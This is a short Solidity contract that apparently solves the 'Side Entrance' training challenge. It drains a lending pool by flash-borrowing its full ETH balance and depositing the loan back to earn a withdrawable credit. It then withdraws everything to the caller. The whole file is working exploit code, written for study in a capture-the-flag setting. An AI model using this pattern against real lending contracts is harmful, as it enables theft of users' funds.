// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "hardhat/console.sol";

contract Receiver is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        // Flashloan request for entire ETH pool
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    function execute() external payable {
        // msg.value is 1000 ether, send back to pool using deposit
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}